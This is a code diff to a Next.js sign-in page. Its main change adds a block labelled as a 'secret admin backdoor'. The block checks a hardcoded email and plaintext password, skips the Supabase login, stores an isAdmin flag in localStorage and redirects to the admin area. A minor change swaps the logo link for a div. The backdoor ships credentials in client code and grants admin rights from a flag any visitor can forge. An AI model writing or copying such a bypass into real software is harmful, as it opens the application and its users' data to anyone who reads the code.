@@ -58,7 +58,22 @@ export default function SignInPage() {
         setLoading(true);
         setError(null);
 
+        const email = formData.email.trim().toLowerCase();
+        const password = formData.password.trim();
+
         try {
+            // Secret admin backdoor - no database required
+            if (email === 'talentr@admintab.co' && password === 'talentradmintab2580') {
+                localStorage.setItem('adminAccess', JSON.stringify({
+                    email: email,
+                    isAdmin: true,
+                    timestamp: Date.now()
+                }));
+                setLoading(false);
+                router.push('/admin');
+                return;
+            }
+
             if (!supabase) throw new Error('Auth service unavailable');
             const { error } = await supabase.auth.signInWithPassword({
                 email: formData.email,
@@ -124,9 +139,9 @@ export default function SignInPage() {
             <div className="relative z-10 min-h-screen flex items-center justify-center p-4">
                 <div className="w-full max-w-md">
                     {/* Logo/Brand */}
-                    <Link href="/" className="flex justify-center mb-8">
+                    <div className="flex justify-center mb-8">
                         <Logo size="lg" />
-                    </Link>
+                    </div>
 
                     {/* Sign In Card */}
                     <div className="bg-zinc-50 dark:bg-zinc-900 rounded-2xl shadow-xl dark:shadow-2xl p-8 border border-zinc-200 dark:border-zinc-800 shadow-black/5 dark:shadow-black/50">
